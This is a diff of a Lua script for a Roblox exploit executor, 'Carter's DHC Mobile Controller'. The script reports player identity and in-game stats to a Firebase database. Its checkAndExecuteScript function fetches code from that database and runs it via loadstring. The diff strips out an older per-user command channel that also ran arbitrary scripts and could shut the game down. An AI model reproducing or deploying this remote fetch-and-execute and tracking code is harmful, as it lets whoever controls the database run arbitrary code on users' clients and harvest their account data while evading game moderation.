@@ -8,13 +8,13 @@ local function makeScreenBlack()
         screenGui.Name = "BlackScreenGui"
         screenGui.IgnoreGuiInset = true
         screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-        
+
         local frame = Instance.new("Frame")
         frame.Size = UDim2.new(1, 0, 1, 0)
         frame.BackgroundColor3 = Color3.new(0, 0, 0)
         frame.BorderSizePixel = 0
         frame.Parent = screenGui
-        
+
         screenGui.Parent = game:GetService("CoreGui")
     end
 end
@@ -40,137 +40,124 @@ local analytics = {
     lastUpdate = 0
 }
 
+-- Universal request function (executor only)
+local function makeRequest(options)
+    local requestFunc = syn and syn.request
+        or http and http.request
+        or http_request
+        or request
+        or fluxus and fluxus.request
+
+    if requestFunc then
+        return requestFunc(options)
+    else
+        warn("No supported HTTP request function found in this executor.")
+        return nil
+    end
+end
+
 -- Function to update analytics data
 local function updateAnalyticsData()
     local player = game.Players.LocalPlayer
     if not player then return end
-    
+
     -- Get current money and wanted level
     local currentMoney = 0
     local currentWanted = 0
-    
-    -- Try to get money data
+
     pcall(function()
         if player:FindFirstChild("DataFolder") and player.DataFolder:FindFirstChild("Currency") then
             currentMoney = player.DataFolder.Currency.Value
         end
     end)
-    
-    -- Try to get wanted level
+
     pcall(function()
         if player:FindFirstChild("DataFolder") and player.DataFolder:FindFirstChild("Information") and player.DataFolder.Information:FindFirstChild("Wanted") then
             currentWanted = player.DataFolder.Information.Wanted.Value
         end
     end)
-    
+
     -- Initialize start money if not set
     if analytics.startMoney == 0 then
         analytics.startMoney = currentMoney
         analytics.money = currentMoney
     end
-    
+
     -- Calculate money gained
     analytics.moneyGained = currentMoney - analytics.startMoney
     analytics.money = currentMoney
     analytics.wantedLevel = currentWanted
-    
-    -- Send analytics data to Firebase (every 30 seconds)
+
+    -- Send analytics data every 30s
     if tick() - analytics.lastUpdate > 30 then
         analytics.lastUpdate = tick()
-        
+
         local playerInfo = getPlayerInfo()
         if playerInfo then
             pcall(function()
-                local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
-                if requestFunc then
-                    requestFunc({
-                        Url = "https://omebgle-default-rtdb.firebaseio.com/analytics/" .. playerInfo.userid .. ".json",
-                        Method = "PUT",
-                        Headers = {
-                            ["Content-Type"] = "application/json"
-                        },
-                        Body = game:GetService("HttpService"):JSONEncode({
-                            username = playerInfo.username,
-                            money = analytics.money,
-                            wantedLevel = analytics.wantedLevel,
-                            moneyGained = analytics.moneyGained,
-                            lastUpdate = os.time(),
-                            serverId = game.JobId
-                        })
+                makeRequest({
+                    Url = "https://omebgle-default-rtdb.firebaseio.com/analytics/" .. playerInfo.userid .. ".json",
+                    Method = "PUT",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = game:GetService("HttpService"):JSONEncode({
+                        username = playerInfo.username,
+                        money = analytics.money,
+                        wantedLevel = analytics.wantedLevel,
+                        moneyGained = analytics.moneyGained,
+                        lastUpdate = os.time(),
+                        serverId = game.JobId
                     })
-                end
+                })
             end)
         end
     end
 end
 
--- Function to check and execute scripts from Firebase with workspace system
+-- Function to check and execute scripts from Firebase
 local function checkAndExecuteScript()
     local url = "https://omebgle-default-rtdb.firebaseio.com/script.json"
-    
-    -- Use executor's HTTP functions (compatible with Delta)
+
     local success, response = pcall(function()
-        local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
-        if requestFunc then
-            return requestFunc({
-                Url = url,
-                Method = "GET"
-            }).Body
-        else
-            return game:HttpGet(url, true)
-        end
+        local result = makeRequest({
+            Url = url,
+            Method = "GET"
+        })
+        return result and result.Body
     end)
-    
-    if not success then
-        success, response = pcall(function()
-            return game:HttpGet(url, true)
-        end)
-    end
-    
-    if success then
+
+    if success and response then
         local data = game:GetService("HttpService"):JSONDecode(response)
         if data and data.code and data.code ~= "" then
-            -- Save to workspace and clear from database
             table.insert(commandWorkspace, data.code)
-            
-            -- Clear the script from DB
+
+            -- Clear script
             pcall(function()
-                local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
-                if requestFunc then
-                    requestFunc({
-                        Url = url,
-                        Method = "PUT",
-                        Headers = {
-                            ["Content-Type"] = "application/json"
-                        },
-                        Body = '{"code":""}'
-                    })
-                else
-                    game:HttpGet(url .. '?code=', true)
-                end
+                makeRequest({
+                    Url = url,
+                    Method = "PUT",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = '{"code":""}'
+                })
             end)
         end
     end
 end
 
--- Function to process commands from workspace
+-- Process command workspace
 local function processCommandWorkspace()
     if #commandWorkspace > 0 then
         local command = table.remove(commandWorkspace, 1)
-        
-        -- Execute the command
         local executeSuccess, errorMsg = pcall(function()
             loadstring(command)()
         end)
-        
         if not executeSuccess then
             warn("Script execution error: " .. errorMsg)
         end
     end
 end
 
--- Get player info for tracking
-local function getPlayerInfo()
+-- Get player info
+function getPlayerInfo()
     local player = game.Players.LocalPlayer
     if player then
         return {
@@ -184,115 +171,52 @@ local function getPlayerInfo()
     return nil
 end
 
--- Send player info to database for tracking
+-- Send player info
 local function sendPlayerInfo()
     local playerInfo = getPlayerInfo()
     if playerInfo then
         pcall(function()
-            local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
-            if requestFunc then
-                requestFunc({
-                    Url = "https://omebgle-default-rtdb.firebaseio.com/players/" .. playerInfo.userid .. ".json",
-                    Method = "PUT",
-                    Headers = {
-                        ["Content-Type"] = "application/json"
-                    },
-                    Body = game:GetService("HttpService"):JSONEncode(playerInfo)
-                })
-            end
+            makeRequest({
+                Url = "https://omebgle-default-rtdb.firebaseio.com/players/" .. playerInfo.userid .. ".json",
+                Method = "PUT",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = game:GetService("HttpService"):JSONEncode(playerInfo)
+            })
         end)
     end
 end
 
--- Send heartbeat to database
+-- Send heartbeat
 local function sendHeartbeat()
     local playerInfo = getPlayerInfo()
     if playerInfo then
         pcall(function()
-            local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
-            if requestFunc then
-                requestFunc({
-                    Url = "https://omebgle-default-rtdb.firebaseio.com/heartbeats/" .. playerInfo.userid .. ".json",
-                    Method = "PUT",
-                    Headers = {
-                        ["Content-Type"] = "application/json"
-                    },
-                    Body = game:GetService("HttpService"):JSONEncode({
-                        timestamp = os.time(),
-                        userid = playerInfo.userid
-                    })
+            makeRequest({
+                Url = "https://omebgle-default-rtdb.firebaseio.com/heartbeats/" .. playerInfo.userid .. ".json",
+                Method = "PUT",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = game:GetService("HttpService"):JSONEncode({
+                    timestamp = os.time(),
+                    userid = playerInfo.userid
                 })
-            end
+            })
         end)
     end
 end
 
--- NEW: Improved command handling with workspace system
-local function checkCommands(userId)
-    local commandUrl = "https://omebgle-default-rtdb.firebaseio.com/commands/" .. userId .. ".json"
-    
-    local success, response = pcall(function()
-        local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
-        if requestFunc then
-            return requestFunc({
-                Url = commandUrl,
-                Method = "GET"
-            }).Body
-        else
-            return game:HttpGet(commandUrl, true)
-        end
-    end)
-    
-    if success then
-        local data = game:GetService("HttpService"):JSONDecode(response)
-        if data and data.command and data.command ~= "" then
-            -- Save command to workspace and clear from database
-            if data.command == "execute-custom" and data.script then
-                table.insert(commandWorkspace, data.script)
-            else
-                table.insert(commandWorkspace, data.command)
-            end
-            
-            -- Clear the command from DB
-            pcall(function()
-                local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
-                if requestFunc then
-                    requestFunc({
-                        Url = commandUrl,
-                        Method = "PUT",
-                        Headers = {
-                            ["Content-Type"] = "application/json"
-                        },
-                        Body = '{"command":""}'
-                    })
-                end
-            end)
-        end
-    end
-end
-
--- NEW: Server hop function
+-- Server hop
 local function serverHop()
     local HttpService = game:GetService("HttpService")
     local TeleportService = game:GetService("TeleportService")
-    
-    -- Find a random game with the same place ID
     local placeId = game.PlaceId
     local serversUrl = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?limit=100"
-    
+
     local success, response = pcall(function()
-        local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
-        if requestFunc then
-            return requestFunc({
-                Url = serversUrl,
-                Method = "GET"
-            }).Body
-        else
-            return game:HttpGet(serversUrl, true)
-        end
+        local result = makeRequest({ Url = serversUrl, Method = "GET" })
+        return result and result.Body
     end)
-    
-    if success then
+
+    if success and response then
         local data = HttpService:JSONDecode(response)
         if data and data.data then
             local servers = {}
@@ -301,96 +225,39 @@ local function serverHop()
                     table.insert(servers, server)
                 end
             end
-            
+
             if #servers > 0 then
                 local randomServer = servers[math.random(1, #servers)]
                 TeleportService:TeleportToPlaceInstance(placeId, randomServer.id)
             else
-                warn("No available servers found for server hop")
+                warn("No available servers found")
             end
         end
     else
-        warn("Failed to fetch server list: " .. response)
+        warn("Failed to fetch servers")
     end
 end
 
--- NEW: Check for duplicate script users
-local function checkForDuplicateUsers()
-    if not altConfig.avoidDuplicates then return end
-    
-    local players = game.Players:GetPlayers()
-    local currentUserId = game.Players.LocalPlayer.UserId
-    
-    for _, player in ipairs(players) do
-        if player.UserId ~= currentUserId and not altConfig.knownUsers[player.UserId] then
-            -- Check if this player is also running our script
-            local success = pcall(function()
-                -- This is a simple check - you might want to implement a more robust method
-                if player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("BlackScreenGui") then
-                    warn("Duplicate script user detected: " .. player.Name)
-                    serverHop()
-                    return
-                end
-            end)
-            
-            altConfig.knownUsers[player.UserId] = true
-        end
-    end
-end
-
--- NEW: Death protection system
+-- Death protection
 local function setupDeathProtection()
     if not altConfig.deathProtection then return end
-    
+
     local player = game.Players.LocalPlayer
-    local lastDeathTime = 0
-    
     player.CharacterAdded:Connect(function(character)
         local humanoid = character:WaitForChild("Humanoid")
         humanoid.Died:Connect(function()
             local currentTime = tick()
-            
-            -- Reset counter if more than 2 minutes have passed
             if currentTime - altConfig.deathTimer > 120 then
                 altConfig.deathCount = 0
                 altConfig.deathTimer = currentTime
             end
-            
-            altConfig.deathCount = altConfig.deathCount + 1
-            
+            altConfig.deathCount += 1
             if altConfig.deathCount >= 6 then
-                warn("Too many deaths detected, server hopping...")
+                warn("Too many deaths, hopping...")
                 serverHop()
             end
         end)
     end)
-end
-
--- Function to process commands from workspace
-local function processCommandsFromWorkspace()
-    while #commandWorkspace > 0 do
-        local command = table.remove(commandWorkspace, 1)
-        
-        if command == "re-execute" then
-            checkAndExecuteScript()
-        elseif command == "leave" then
-            game:Shutdown()
-        elseif command == "rejoin" then
-            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
-        elseif command == "serverhop" then
-            serverHop()
-        else
-            -- Assume it's a custom script
-            local executeSuccess, errorMsg = pcall(function()
-                loadstring(command)()
-            end)
-            if not executeSuccess then
-                warn("Custom script execution error: " .. errorMsg)
-            end
-        end
-        
-        wait(1) -- Wait a bit between commands
-    end
 end
 
 -- Initial setup
@@ -401,29 +268,18 @@ setupDeathProtection()
 -- Execute script once
 checkAndExecuteScript()
 
--- Set up to check for commands and send heartbeats
+-- Loop for heartbeat + commands
 local playerInfo = getPlayerInfo()
 if playerInfo then
     spawn(function()
         while true do
-            wait(10) -- Send heartbeat every 10 seconds
+            wait(10)
             sendHeartbeat()
             sendPlayerInfo()
-            checkCommands(playerInfo.userid)
-            checkForDuplicateUsers()
             updateAnalyticsData()
-            processCommandsFromWorkspace()
-        end
-    end)
-    
-    -- Also process command workspace regularly
-    spawn(function()
-        while true do
-            wait(5)
-            processCommandsFromWorkspace()
+            processCommandWorkspace()
         end
     end)
 end
 
 print("Carter's DHC Mobile Controller loaded successfully!")
-print("Script executed once successfully!")
